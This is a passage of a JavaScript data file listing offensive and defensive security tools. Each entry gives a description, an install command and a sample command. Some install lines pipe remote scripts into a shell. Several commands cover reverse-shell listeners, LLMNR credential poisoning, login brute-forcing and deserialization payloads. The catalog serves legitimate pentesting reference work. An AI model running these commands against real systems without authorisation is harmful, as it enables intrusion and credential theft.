/* ============================================================
   BugBounty HQ — tools-data.js
   300+ Security tools database
   ============================================================ */

const TOOLS = [
  /* ──────────── RECONNAISSANCE ──────────── */
  { id:'nmap',        name:'Nmap',           cat:'recon',     lang:'C',        tags:['port-scan','network','ping'],       desc:'Powerful open-source tool for network discovery and security auditing. Supports host discovery, port scanning, service detection, and OS fingerprinting.', install:'apt install nmap', cmd:'nmap -sV -sC -oA scan {target}', url:'https://nmap.org', github:'https://github.com/nmap/nmap' },
  { id:'masscan',     name:'Masscan',        cat:'recon',     lang:'C',        tags:['port-scan','fast','async'],         desc:'The fastest Internet port scanner, capable of scanning the entire Internet in under 5 minutes.', install:'apt install masscan', cmd:'masscan -p1-65535 {target} --rate=1000', url:'https://github.com/robertdavidgraham/masscan' },
  { id:'amass',       name:'Amass',          cat:'recon',     lang:'Go',       tags:['subdomain','dns','osint'],          desc:'In-depth Attack Surface Mapping and Asset Discovery. Performs DNS enumeration, scraping, certificates, APIs.', install:'go install -v github.com/owasp-amass/amass/v4/...@master', cmd:'amass enum -passive -d {domain} -o out.txt', url:'https://github.com/owasp-amass/amass' },
  { id:'subfinder',   name:'Subfinder',      cat:'recon',     lang:'Go',       tags:['subdomain','passive','api'],        desc:'Fast passive subdomain discovery tool using various passive sources like cert transparency, DNS datasets, APIs.', install:'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest', cmd:'subfinder -d {domain} -o subs.txt', url:'https://github.com/projectdiscovery/subfinder' },
  { id:'assetfinder', name:'Assetfinder',    cat:'recon',     lang:'Go',       tags:['subdomain','passive'],              desc:'Find domains and subdomains related to a given domain using various APIs and sources.', install:'go install github.com/tomnomnom/assetfinder@latest', cmd:'assetfinder --subs-only {domain}', url:'https://github.com/tomnomnom/assetfinder' },
  { id:'dnsx',        name:'DNSx',           cat:'recon',     lang:'Go',       tags:['dns','resolver','brute'],           desc:'Fast and multi-purpose DNS toolkit that allows running multiple DNS queries with user-supplied resolvers.', install:'go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest', cmd:'dnsx -l subs.txt -a -resp', url:'https://github.com/projectdiscovery/dnsx' },
  { id:'httpx',       name:'HTTPx',          cat:'recon',     lang:'Go',       tags:['http','probe','status'],            desc:'Fast and multi-purpose HTTP toolkit that allows running multiple HTTP probes on a list of hosts.', install:'go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest', cmd:'httpx -l subs.txt -status-code -title -tech-detect', url:'https://github.com/projectdiscovery/httpx' },
  { id:'shodan',      name:'Shodan CLI',     cat:'recon',     lang:'Python',   tags:['osint','iot','exposed'],            desc:'Search engine for Internet-connected devices. Find servers, webcams, printers, routers and all the other stuff.', install:'pip install shodan', cmd:'shodan search hostname:{domain}', url:'https://shodan.io' },
  { id:'censys',      name:'Censys',         cat:'recon',     lang:'Python',   tags:['osint','certificates','ips'],       desc:'Comprehensive internet-wide scanning platform. Query certificates, IPv4 hosts, and websites.', install:'pip install censys', cmd:'censys search {domain}', url:'https://censys.io' },
  { id:'theHarvester',name:'theHarvester',   cat:'recon',     lang:'Python',   tags:['osint','emails','dns'],             desc:'Gathers open source intelligence (OSINT) on a company or domain: emails, subdomains, IPs, and URLs.', install:'apt install theharvester', cmd:'theHarvester -d {domain} -b all', url:'https://github.com/laramies/theHarvester' },
  { id:'whois',       name:'Whois',          cat:'recon',     lang:'Bash',     tags:['dns','registration','domain'],      desc:'Query WHOIS databases for domain registration information, registrar details, nameservers, and contacts.', install:'apt install whois', cmd:'whois {domain}', url:'https://linux.die.net/man/1/whois' },
  { id:'recon-ng',    name:'Recon-ng',       cat:'recon',     lang:'Python',   tags:['framework','osint','modules'],      desc:'Full-featured web reconnaissance framework written in Python with independent modules for data gathering.', install:'pip install recon-ng', cmd:'recon-ng -w {workspace}', url:'https://github.com/lanmaster53/recon-ng' },
  { id:'spiderfoot',  name:'SpiderFoot',     cat:'recon',     lang:'Python',   tags:['osint','automation','footprint'],   desc:'Automated OSINT collection tool that queries 100+ data sources to gather intelligence about IP addresses, domains, emails and more.', install:'pip install spiderfoot', cmd:'sf.py -s {target} -t INTERNET_NAME', url:'https://github.com/smicallef/spiderfoot' },
  { id:'shosubgo',    name:'Shosubgo',       cat:'recon',     lang:'Go',       tags:['shodan','subdomain'],               desc:'Small tool to grab subdomains using Shodan API.', install:'go install github.com/incogbyte/shosubgo@latest', cmd:'shosubgo -d {domain} -s {shodan-api}', url:'https://github.com/incogbyte/shosubgo' },
  { id:'chaos',       name:'Chaos',          cat:'recon',     lang:'Go',       tags:['subdomain','projectdiscovery'],     desc:'Actively scan and maintain internet-wide assets data. Easily integrate chaos datasets into your tooling.', install:'go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest', cmd:'chaos -d {domain}', url:'https://github.com/projectdiscovery/chaos-client' },
  { id:'gau',         name:'GAU',            cat:'recon',     lang:'Go',       tags:['urls','wayback','archive'],         desc:'Fetch known URLs from AlienVault OTX, Wayback Machine, and Common Crawl for any given domain.', install:'go install github.com/lc/gau/v2/cmd/gau@latest', cmd:'gau {domain} | tee urls.txt', url:'https://github.com/lc/gau' },
  { id:'waybackurls', name:'Waybackurls',    cat:'recon',     lang:'Go',       tags:['urls','wayback','archive'],         desc:'Fetch all URLs that the Wayback Machine has for a given domain.', install:'go install github.com/tomnomnom/waybackurls@latest', cmd:'waybackurls {domain}', url:'https://github.com/tomnomnom/waybackurls' },
  { id:'katana',      name:'Katana',         cat:'recon',     lang:'Go',       tags:['crawler','spider','js'],            desc:'Next-generation crawling and spidering framework with support for JavaScript and multiple output formats.', install:'go install github.com/projectdiscovery/katana/cmd/katana@latest', cmd:'katana -u https://{domain} -jc', url:'https://github.com/projectdiscovery/katana' },
  { id:'hakrawler',   name:'Hakrawler',      cat:'recon',     lang:'Go',       tags:['crawler','spider','urls'],          desc:'Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application.', install:'go install github.com/hakluke/hakrawler@latest', cmd:'echo https://{domain} | hakrawler', url:'https://github.com/hakluke/hakrawler' },
  { id:'gospider',    name:'GoSpider',       cat:'recon',     lang:'Go',       tags:['crawler','spider','links'],         desc:'Fast web spider written in Go with support for JS crawling, sitemap, robots.txt and multiple output formats.', install:'go install github.com/jaeles-project/gospider@latest', cmd:'gospider -s https://{domain} -o output -c 10', url:'https://github.com/jaeles-project/gospider' },

  /* ──────────── WEB APPLICATION ──────────── */
  { id:'burpsuite',   name:'Burp Suite',     cat:'web',       lang:'Java',     tags:['proxy','scanner','web'],            desc:'The leading toolkit for web security testing. Intercept and modify HTTP traffic, scan for vulnerabilities, and test web apps manually or automatically.', install:'Download from portswigger.net', cmd:'java -jar burpsuite_community.jar', url:'https://portswigger.net/burp' },
  { id:'nikto',       name:'Nikto',          cat:'web',       lang:'Perl',     tags:['scanner','cve','web'],              desc:'Open Source web server scanner that performs comprehensive tests against web servers for multiple dangerous files and outdated versions.', install:'apt install nikto', cmd:'nikto -h https://{target}', url:'https://github.com/sullo/nikto' },
  { id:'sqlmap',      name:'SQLMap',         cat:'web',       lang:'Python',   tags:['sql-injection','database','auto'],  desc:'Automatic SQL injection and database takeover tool. Detects and exploits SQL injection flaws with a powerful detection engine.', install:'apt install sqlmap', cmd:'sqlmap -u "https://{target}/page?id=1" --dbs', url:'https://sqlmap.org' },
  { id:'xsstrike',    name:'XSStrike',       cat:'web',       lang:'Python',   tags:['xss','scanner','fuzzer'],           desc:'Advanced XSS detection suite with fuzzing, crawling, DOM parsing, and WAF bypass capabilities.', install:'git clone https://github.com/s0md3v/XSStrike', cmd:'python3 xsstrike.py -u "https://{target}/search?q=test"', url:'https://github.com/s0md3v/XSStrike' },
  { id:'dalfox',      name:'Dalfox',         cat:'web',       lang:'Go',       tags:['xss','scanner','fast'],             desc:'Powerful XSS scanning tool and parameter analysis tool. Supports DOM XSS, blind XSS, and WAF bypass techniques.', install:'go install github.com/hahwul/dalfox/v2@latest', cmd:'dalfox url https://{target}/search?q=1', url:'https://github.com/hahwul/dalfox' },
  { id:'nuclei',      name:'Nuclei',         cat:'web',       lang:'Go',       tags:['scanner','templates','cve'],        desc:'Fast and customizable vulnerability scanner based on simple YAML-based DSL with 5000+ community templates.', install:'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest', cmd:'nuclei -u https://{target} -t cves/', url:'https://github.com/projectdiscovery/nuclei' },
  { id:'whatweb',     name:'WhatWeb',        cat:'web',       lang:'Ruby',     tags:['fingerprint','tech','cms'],         desc:'Next generation web scanner that identifies websites and recognizes technologies including CMS, JavaScript libraries, servers.', install:'apt install whatweb', cmd:'whatweb -v https://{target}', url:'https://github.com/urbanadventurer/WhatWeb' },
  { id:'wapiti',      name:'Wapiti',         cat:'web',       lang:'Python',   tags:['scanner','injection','xss'],        desc:'Web application vulnerability scanner with modules for SQL injection, XSS, file inclusion, SSRF, and more.', install:'pip install wapiti3', cmd:'wapiti -u https://{target}', url:'https://github.com/wapiti-scanner/wapiti' },
  { id:'feroxbuster', name:'Feroxbuster',    cat:'web',       lang:'Rust',     tags:['dirbrute','fuzzing','fast'],        desc:'Fast, simple, recursive content discovery tool written in Rust. Excellent for directory and file brute forcing.', install:'apt install feroxbuster', cmd:'feroxbuster -u https://{target} -w wordlist.txt', url:'https://github.com/epi052/feroxbuster' },
  { id:'gobuster',    name:'Gobuster',       cat:'web',       lang:'Go',       tags:['dirbrute','dns','vhost'],           desc:'Directory/file & DNS busting tool written in Go. Supports dir, DNS, vhost, S3, GCS, TFTP, FUZZ modes.', install:'go install github.com/OJ/gobuster/v3@latest', cmd:'gobuster dir -u https://{target} -w /usr/share/wordlists/dirb/common.txt', url:'https://github.com/OJ/gobuster' },
  { id:'ffuf',        name:'FFUF',           cat:'web',       lang:'Go',       tags:['fuzzing','dirbrute','vhost'],       desc:'Fast web fuzzer written in Go. Supports multiple wordlists, recursion, output formats, and filtering options.', install:'go install github.com/ffuf/ffuf/v2@latest', cmd:'ffuf -u https://{target}/FUZZ -w wordlist.txt', url:'https://github.com/ffuf/ffuf' },
  { id:'dirsearch',   name:'Dirsearch',      cat:'web',       lang:'Python',   tags:['dirbrute','web','path'],            desc:'Advanced command-line tool designed to brute force directories and files in websites using multiple extensions and recursion.', install:'pip install dirsearch', cmd:'dirsearch -u https://{target}', url:'https://github.com/maurosoria/dirsearch' },
  { id:'arjun',       name:'Arjun',          cat:'web',       lang:'Python',   tags:['parameter','discovery','hidden'],   desc:'HTTP parameter discovery suite. Finds query parameters for URL endpoints, including hidden and undocumented ones.', install:'pip install arjun', cmd:'arjun -u https://{target}/search', url:'https://github.com/s0md3v/Arjun' },
  { id:'commix',      name:'Commix',         cat:'web',       lang:'Python',   tags:['command-injection','rce','auto'],   desc:'Automated tool for testing and exploiting command injection vulnerabilities in web applications.', install:'git clone https://github.com/commixproject/commix', cmd:'python3 commix.py --url="https://{target}/ping?ip=127.0.0.1"', url:'https://github.com/commixproject/commix' },
  { id:'tplmap',      name:'Tplmap',         cat:'web',       lang:'Python',   tags:['ssti','template-injection','rce'],  desc:'Automatic Server-Side Template Injection detection and exploitation tool.', install:'git clone https://github.com/epinna/tplmap', cmd:'python3 tplmap.py -u https://{target}/page?name=1', url:'https://github.com/epinna/tplmap' },
  { id:'corsy',       name:'Corsy',          cat:'web',       lang:'Python',   tags:['cors','misconfiguration','bypass'], desc:'CORS misconfiguration scanner. Tests various CORS misconfigurations including origin reflection, null origin, and prefix matching.', install:'pip install corsy', cmd:'python3 corsy.py -u https://{target}', url:'https://github.com/s0md3v/Corsy' },
  { id:'ssrfmap',     name:'SSRFmap',        cat:'web',       lang:'Python',   tags:['ssrf','server-side','injection'],   desc:'Automatic SSRF Fuzzer and Exploitation Tool. Scans for SSRF vulnerabilities and attempts to escalate them.', install:'git clone https://github.com/swisskyrepo/SSRFmap', cmd:'python3 ssrfmap.py -r request.txt -p url', url:'https://github.com/swisskyrepo/SSRFmap' },
  { id:'cariddi',     name:'Cariddi',        cat:'web',       lang:'Go',       tags:['crawler','endpoints','secrets'],    desc:'Take a list of domains, crawl urls and scan for endpoints, secrets, API keys, extensions, tokens.', install:'go install github.com/edoardottt/cariddi/cmd/cariddi@latest', cmd:'echo {domain} | cariddi -s -e', url:'https://github.com/edoardottt/cariddi' },

  /* ──────────── EXPLOITATION ──────────── */
  { id:'metasploit',  name:'Metasploit',     cat:'exploit',   lang:'Ruby',     tags:['exploit','framework','payloads'],   desc:'World\'s most used penetration testing framework. Advanced open-source platform for developing, testing, and executing exploits.', install:'curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sh', cmd:'msfconsole -q', url:'https://metasploit.com' },
  { id:'searchsploit',name:'SearchSploit',   cat:'exploit',   lang:'Bash',     tags:['exploitdb','cve','offline'],        desc:'Command-line search tool for Exploit-DB. Search locally for exploits and shellcodes while offline.', install:'apt install exploitdb', cmd:'searchsploit {software} {version}', url:'https://github.com/offensive-security/exploitdb' },
  { id:'pwncat',      name:'Pwncat',         cat:'exploit',   lang:'Python',   tags:['reverse-shell','listener','post'],  desc:'Fancy reverse and bind shell handler with automatic local privilege escalation, file upload/download, and persistence.', install:'pip install pwncat-cs', cmd:'pwncat-cs -lp 4444', url:'https://github.com/calebstewart/pwncat' },
  { id:'evil-winrm',  name:'Evil-WinRM',     cat:'exploit',   lang:'Ruby',     tags:['windows','winrm','shell'],          desc:'Windows Remote Management (WinRM) shell for hacking/pentesting. Supports pass-the-hash, AMSI bypass, file upload/download.', install:'gem install evil-winrm', cmd:'evil-winrm -i {target} -u {user} -p {pass}', url:'https://github.com/Hackplayers/evil-winrm' },
  { id:'crackmapexec',name:'CrackMapExec',   cat:'exploit',   lang:'Python',   tags:['smb','active-directory','lateral'], desc:'Swiss army knife for pentesting networks. Enumerate hosts, exploit vulnerabilities, execute commands via SMB, WinRM, SSH.', install:'apt install crackmapexec', cmd:'crackmapexec smb {target} -u {user} -p {pass}', url:'https://github.com/Porchetta-Industries/CrackMapExec' },
  { id:'impacket',    name:'Impacket',       cat:'exploit',   lang:'Python',   tags:['windows','smb','kerberos'],         desc:'Collection of Python classes for working with network protocols. Includes tools for SMB, Kerberoasting, DCOM, DCE/RPC.', install:'pip install impacket', cmd:'python3 GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {dc}', url:'https://github.com/SecureAuthCorp/impacket' },
  { id:'responder',   name:'Responder',      cat:'exploit',   lang:'Python',   tags:['mitm','llmnr','ntlm','poison'],     desc:'LLMNR, NBT-NS and MDNS poisoner that allows capturing NTLMv2 challenge-response credentials from victim machines.', install:'git clone https://github.com/lgandx/Responder', cmd:'python3 Responder.py -I eth0 -wrf', url:'https://github.com/lgandx/Responder' },
  { id:'covenant',    name:'Covenant',       cat:'exploit',   lang:'C#',       tags:['c2','rat','post-exploit'],          desc:'.NET command and control framework. Collaborative pentesting platform with Grunt implants and task modules.', install:'docker pull thundaquiche/covenant', cmd:'dotnet run', url:'https://github.com/cobbr/Covenant' },
  { id:'sliver',      name:'Sliver',         cat:'exploit',   lang:'Go',       tags:['c2','implant','cross-platform'],    desc:'General purpose cross-platform implant framework that supports multiple C2 channels and implant customization.', install:'curl https://sliver.sh/install|sudo bash', cmd:'sliver', url:'https://github.com/BishopFox/sliver' },
  { id:'ysoserial',   name:'ysoserial',      cat:'exploit',   lang:'Java',     tags:['deserialization','java','rce'],     desc:'Proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.', install:'Download from GitHub releases', cmd:'java -jar ysoserial.jar CommonsCollections6 "cmd" | xxd', url:'https://github.com/frohoff/ysoserial' },

  /* ──────────── FUZZING ──────────── */
  { id:'wfuzz',       name:'Wfuzz',          cat:'fuzzing',   lang:'Python',   tags:['fuzzer','web','parameter'],         desc:'Web application brute force and fuzz testing tool. Substitute any field in an HTTP request with various payloads.', install:'pip install wfuzz', cmd:'wfuzz -c -w wordlist.txt --hc 404 https://{target}/FUZZ', url:'https://github.com/xmendez/wfuzz' },
  { id:'radamsa',     name:'Radamsa',        cat:'fuzzing',   lang:'C',        tags:['mutational','binary','protocol'],   desc:'General-purpose fuzzer that generates test inputs by mutating given sample inputs using various algorithms.', install:'apt install radamsa', cmd:'echo "test" | radamsa', url:'https://gitlab.com/akihe/radamsa' },
  { id:'boofuzz',     name:'Boofuzz',        cat:'fuzzing',   lang:'Python',   tags:['network','protocol','structured'],  desc:'Network protocol fuzzing framework. Successor to the popular Sulley fuzzing framework.', install:'pip install boofuzz', cmd:'python3 session.py', url:'https://github.com/jtpereyda/boofuzz' },
  { id:'afl',         name:'AFL++',          cat:'fuzzing',   lang:'C',        tags:['binary','coverage','mutational'],   desc:'State-of-the-art fuzzer with support for multiple programming languages and built-in QEMU and Frida mode.', install:'apt install afl++', cmd:'afl-fuzz -i input/ -o output/ -- ./target @@', url:'https://github.com/AFLplusplus/AFLplusplus' },
  { id:'libfuzzer',   name:'LibFuzzer',      cat:'fuzzing',   lang:'C++',      tags:['in-process','coverage','llvm'],     desc:'In-process, coverage-guided, evolutionary fuzzing engine integrated with LLVM/Clang for fuzzing C/C++ code.', install:'apt install clang', cmd:'clang -fsanitize=fuzzer,address -o fuzz target.c && ./fuzz', url:'https://llvm.org/docs/LibFuzzer.html' },
  { id:'oss-fuzz',    name:'OSS-Fuzz',       cat:'fuzzing',   lang:'Python',   tags:['cloud','continuous','open-source'], desc:'Continuous fuzzing for open source software. Google\'s open source fuzzing infrastructure supporting multiple fuzz engines.', install:'git clone https://github.com/google/oss-fuzz', cmd:'python3 infra/helper.py build_fuzzers {project}', url:'https://github.com/google/oss-fuzz' },

  /* ──────────── NETWORK ──────────── */
  { id:'wireshark',   name:'Wireshark',      cat:'network',   lang:'C',        tags:['packet','capture','analysis'],      desc:'World\'s foremost network protocol analyzer. Capture and interactively analyze network traffic from hundreds of protocols.', install:'apt install wireshark', cmd:'wireshark', url:'https://wireshark.org' },
  { id:'tcpdump',     name:'Tcpdump',        cat:'network',   lang:'C',        tags:['packet','capture','cli'],           desc:'Command-line packet analyzer. Capture and display network packets matching a boolean expression for network troubleshooting.', install:'apt install tcpdump', cmd:'tcpdump -i eth0 -w capture.pcap', url:'https://tcpdump.org' },
  { id:'netcat',      name:'Netcat',         cat:'network',   lang:'C',        tags:['shell','listener','tcp'],           desc:'Networking utility for reading/writing across network connections using TCP or UDP. The Swiss army knife of networking.', install:'apt install netcat', cmd:'nc -lvnp 4444', url:'https://netcat.sourceforge.net' },
  { id:'scapy',       name:'Scapy',          cat:'network',   lang:'Python',   tags:['packet','craft','analysis'],        desc:'Powerful interactive packet manipulation library. Forge or decode packets, send them, capture them, and analyze them.', install:'pip install scapy', cmd:'python3 -c "from scapy.all import *; sr1(IP(dst=\'{target}\')/ICMP())"', url:'https://scapy.net' },
  { id:'bettercap',   name:'Bettercap',      cat:'network',   lang:'Go',       tags:['mitm','arp','sniff','hijack'],      desc:'Swiss Army knife for WiFi, Bluetooth, HID, and Ethernet network attacks and monitoring.', install:'apt install bettercap', cmd:'sudo bettercap -iface eth0', url:'https://www.bettercap.org' },
  { id:'ettercap',    name:'Ettercap',       cat:'network',   lang:'C',        tags:['mitm','sniff','arp'],               desc:'Comprehensive suite for man-in-the-middle attacks with sniffing, OS fingerprinting, and content filtering.', install:'apt install ettercap-graphical', cmd:'ettercap -G', url:'https://www.ettercap-project.org' },
  { id:'zeek',        name:'Zeek',           cat:'network',   lang:'C++',      tags:['ids','analysis','scripts'],         desc:'Network security monitoring framework for detecting network intrusions with a powerful scripting language.', install:'apt install zeek', cmd:'zeek -i eth0 /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek', url:'https://zeek.org' },
  { id:'netdiscover', name:'Netdiscover',    cat:'network',   lang:'C',        tags:['arp','discovery','lan'],            desc:'Active/passive ARP reconnaissance tool. Useful for networks without DHCP server to discover network hosts.', install:'apt install netdiscover', cmd:'netdiscover -i eth0 -r 192.168.1.0/24', url:'https://github.com/netdiscover-scanner/netdiscover' },
  { id:'arp-scan',    name:'ARP-Scan',       cat:'network',   lang:'C',        tags:['arp','discovery','mac'],            desc:'Tool for discovering and fingerprinting IP hosts on the local network by sending ARP packets.', install:'apt install arp-scan', cmd:'sudo arp-scan --localnet', url:'https://github.com/royhills/arp-scan' },

  /* ──────────── CLOUD ──────────── */
  { id:'cloudsploit', name:'CloudSploit',    cat:'cloud',     lang:'Node.js',  tags:['aws','gcp','azure','audit'],        desc:'Cloud security vulnerability detection tool supporting AWS, Azure, GCP, and Oracle Cloud with 400+ checks.', install:'npm install -g cloudsploit', cmd:'cloudsploit scan --provider aws', url:'https://github.com/aquasecurity/cloudsploit' },
  { id:'prowler',     name:'Prowler',        cat:'cloud',     lang:'Python',   tags:['aws','audit','compliance'],         desc:'AWS security assessment, auditing, hardening, and incident response tool with 400+ checks for CIS and GDPR compliance.', install:'pip install prowler', cmd:'prowler aws --profile {profile}', url:'https://github.com/prowler-cloud/prowler' },
  { id:'pacu',        name:'Pacu',           cat:'cloud',     lang:'Python',   tags:['aws','exploit','post'],             desc:'Open source AWS exploitation framework for testing security of Amazon Web Services environments.', install:'pip install pacu', cmd:'pacu', url:'https://github.com/RhinoSecurityLabs/pacu' },
  { id:'s3scanner',   name:'S3Scanner',      cat:'cloud',     lang:'Go',       tags:['aws','s3','bucket','enum'],         desc:'Scan for open S3 buckets and dump their content. Supports multiple AWS regions and bucket enumeration techniques.', install:'go install github.com/sa7mon/S3Scanner@latest', cmd:'s3scanner scan --bucket {bucket-name}', url:'https://github.com/sa7mon/S3Scanner' },
  { id:'truffleHog',  name:'TruffleHog',     cat:'cloud',     lang:'Go',       tags:['secrets','git','api-keys'],         desc:'Searches through git repositories for secrets, digging deep into commit history and branches. Finds high entropy strings.', install:'pip install trufflehog', cmd:'trufflehog git https://github.com/{user}/{repo}', url:'https://github.com/trufflesecurity/trufflehog' },
  { id:'gitleaks',    name:'Gitleaks',       cat:'cloud',     lang:'Go',       tags:['secrets','git','scan'],             desc:'Detect and prevent hardcoded secrets in git repos. Scans commits for API keys, tokens, and passwords.', install:'go install github.com/gitleaks/gitleaks/v8@latest', cmd:'gitleaks detect --source .', url:'https://github.com/gitleaks/gitleaks' },
  { id:'cloudmapper', name:'CloudMapper',    cat:'cloud',     lang:'Python',   tags:['aws','visualization','network'],    desc:'Analyze your AWS environments and create network diagrams of your assets and their relationships.', install:'pip install cloudmapper', cmd:'python3 cloudmapper.py prepare --account {account}', url:'https://github.com/duo-labs/cloudmapper' },
  { id:'scoutsuite',  name:'ScoutSuite',     cat:'cloud',     lang:'Python',   tags:['aws','azure','gcp','audit'],        desc:'Multi-cloud security-auditing tool enabling security posture assessment of cloud environments.', install:'pip install scoutsuite', cmd:'python3 scout.py aws --profile {profile}', url:'https://github.com/nccgroup/ScoutSuite' },

  /* ──────────── MOBILE ──────────── */
  { id:'apktool',     name:'APKTool',        cat:'mobile',    lang:'Java',     tags:['android','reverse','decompile'],    desc:'Tool for reverse engineering third-party, closed, binary Android apps. Decode and rebuild APKs.', install:'apt install apktool', cmd:'apktool d {app.apk} -o output/', url:'https://ibotpeaches.github.io/Apktool' },
  { id:'jadx',        name:'JADX',           cat:'mobile',    lang:'Java',     tags:['android','decompile','java'],       desc:'Dex to Java decompiler. Command-line and GUI tools for decompiling Android APK and dex files to Java source.', install:'apt install jadx', cmd:'jadx -d output/ {app.apk}', url:'https://github.com/skylot/jadx' },
  { id:'frida',       name:'Frida',          cat:'mobile',    lang:'Python',   tags:['dynamic','hook','instrument'],      desc:'Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. Hook functions at runtime.', install:'pip install frida-tools', cmd:'frida -U -l hook.js com.example.app', url:'https://frida.re' },
  { id:'objection',   name:'Objection',      cat:'mobile',    lang:'Python',   tags:['ios','android','runtime'],          desc:'Runtime mobile exploration toolkit powered by Frida. Test security without needing a jailbroken device.', install:'pip install objection', cmd:'objection -g com.example.app explore', url:'https://github.com/sensepost/objection' },
  { id:'mobsf',       name:'MobSF',          cat:'mobile',    lang:'Python',   tags:['android','ios','scanner','static'], desc:'Automated mobile app security testing framework supporting Android and iOS static and dynamic analysis.', install:'pip install mobsf', cmd:'python3 manage.py runserver 0.0.0.0:8000', url:'https://github.com/MobSF/Mobile-Security-Framework-MobSF' },
  { id:'drozer',      name:'Drozer',         cat:'mobile',    lang:'Python',   tags:['android','components','attack'],    desc:'Comprehensive security and attack framework for Android. Test the security of Android apps and devices.', install:'pip install drozer', cmd:'drozer console connect', url:'https://github.com/WithSecureLabs/drozer' },
  { id:'iFunbox',     name:'iProxy',         cat:'mobile',    lang:'Python',   tags:['ios','ssl','mitm'],                 desc:'Proxy for iOS devices and the iOS simulator allowing interception and modification of HTTPS traffic.', install:'pip install iproxy', cmd:'iproxy 8080 8080', url:'https://github.com/chetan-conikee/iproxy' },

  /* ──────────── OSINT ──────────── */
  { id:'maltego',     name:'Maltego',        cat:'osint',     lang:'Java',     tags:['graph','relationships','intel'],    desc:'Interactive data mining tool that renders directed graphs for link analysis. Visualize complex relationships between entities.', install:'Download from maltego.com', cmd:'maltego', url:'https://www.maltego.com' },
  { id:'sherlock',    name:'Sherlock',       cat:'osint',     lang:'Python',   tags:['username','social','hunt'],         desc:'Hunt down social media accounts by username across 300+ social networks including Twitter, Instagram, GitHub.', install:'pip install sherlock-project', cmd:'sherlock {username}', url:'https://github.com/sherlock-project/sherlock' },
  { id:'holehe',      name:'Holehe',         cat:'osint',     lang:'Python',   tags:['email','accounts','check'],         desc:'Efficiently check if an email is attached to an account on over 120 different websites.', install:'pip install holehe', cmd:'holehe {email}', url:'https://github.com/megadose/holehe' },
  { id:'photon',      name:'Photon',         cat:'osint',     lang:'Python',   tags:['crawler','data','extract'],         desc:'Incredibly fast crawler designed for OSINT. Extracts URLs, emails, social media accounts, files, and secret keys.', install:'git clone https://github.com/s0md3v/Photon', cmd:'python3 photon.py -u https://{target} --keys', url:'https://github.com/s0md3v/Photon' },
  { id:'metagoofil',  name:'Metagoofil',     cat:'osint',     lang:'Python',   tags:['metadata','documents','files'],     desc:'Tool for extracting metadata from public documents (.pdf, .doc, .xls, .ppt) from a target domain.', install:'pip install metagoofil', cmd:'metagoofil -d {domain} -t pdf,doc -n 50', url:'https://github.com/opsdisk/metagoofil' },
  { id:'ghunt',       name:'GHunt',          cat:'osint',     lang:'Python',   tags:['google','email','account'],         desc:'Offensive Google framework to investigate users using Google accounts. Retrieve Google account info, leaked data.', install:'pip install ghunt', cmd:'ghunt login && ghunt email {email}', url:'https://github.com/mxrch/GHunt' },
  { id:'phoneinfoga',  name:'PhoneInfoga',   cat:'osint',     lang:'Go',       tags:['phone','number','carrier'],         desc:'Advanced information gathering & OSINT recon tool for phone numbers. Scan with various techniques.', install:'go install github.com/sundowndev/phoneinfoga/v2/cmd/phoneinfoga@latest', cmd:'phoneinfoga scan -n {phone}', url:'https://github.com/sundowndev/phoneinfoga' },
  { id:'exiftool',    name:'ExifTool',       cat:'osint',     lang:'Perl',     tags:['metadata','image','exif'],          desc:'Platform-independent Perl library and CLI tool for reading, writing and editing meta information in files.', install:'apt install exiftool', cmd:'exiftool -all {image.jpg}', url:'https://exiftool.org' },

  /* ──────────── PASSWORD ATTACKS ──────────── */
  { id:'hashcat',     name:'Hashcat',        cat:'passwords', lang:'C',        tags:['crack','gpu','hash'],               desc:'World\'s fastest and most advanced password recovery utility supporting 320+ algorithms and 3 attack modes with GPU acceleration.', install:'apt install hashcat', cmd:'hashcat -m 0 -a 0 hashes.txt wordlist.txt', url:'https://hashcat.net' },
  { id:'johntheripper',name:'John the Ripper',cat:'passwords',lang:'C',        tags:['crack','cpu','hash'],               desc:'Free and open-source password security auditing and password recovery tool. Detects weak Unix passwords.', install:'apt install john', cmd:'john --wordlist=rockyou.txt hashes.txt', cmd2:'john --show hashes.txt', url:'https://www.openwall.com/john' },
  { id:'hydra',       name:'Hydra',          cat:'passwords', lang:'C',        tags:['brute-force','login','online'],     desc:'Fast and flexible network login cracker supporting 50+ protocols including SSH, FTP, HTTP, SMTP, LDAP, SMB.', install:'apt install hydra', cmd:'hydra -l {user} -P wordlist.txt {target} ssh', url:'https://github.com/vanhauser-thc/thc-hydra' },
  { id:'medusa',      name:'Medusa',         cat:'passwords', lang:'C',        tags:['brute-force','parallel','login'],   desc:'Speedy, massively parallel, modular, login brute-force tool supporting SSH, FTP, HTTP, IMAP, SMB and more.', install:'apt install medusa', cmd:'medusa -h {target} -u {user} -P wordlist.txt -M ssh', url:'https://github.com/jmk-foofus/medusa' },
  { id:'cewl',        name:'CeWL',           cat:'passwords', lang:'Ruby',     tags:['wordlist','custom','spider'],       desc:'Spider a target URL to a specified depth and creates a wordlist based on words found on the site.', install:'gem install cewl', cmd:'cewl https://{target} -m 6 -w custom_wordlist.txt', url:'https://github.com/digininja/CeWL' },
  { id:'crunch',      name:'Crunch',         cat:'passwords', lang:'C',        tags:['wordlist','generator','pattern'],   desc:'Wordlist generator where you can specify a standard character set or any set to generate all permutations and combinations.', install:'apt install crunch', cmd:'crunch 8 8 abcdefghijklmnopqrstuvwxyz > wordlist.txt', url:'https://github.com/crunchsec/crunch' },

  /* ──────────── MISC TOOLS ──────────── */
  { id:'chisel',      name:'Chisel',         cat:'misc',      lang:'Go',       tags:['tunnel','pivot','forward'],         desc:'Fast TCP/UDP tunnel over HTTP using SSH for port forwarding and network pivoting across firewalls.', install:'go install github.com/jpillora/chisel@latest', cmd:'chisel server -p 8080 --reverse', url:'https://github.com/jpillora/chisel' },
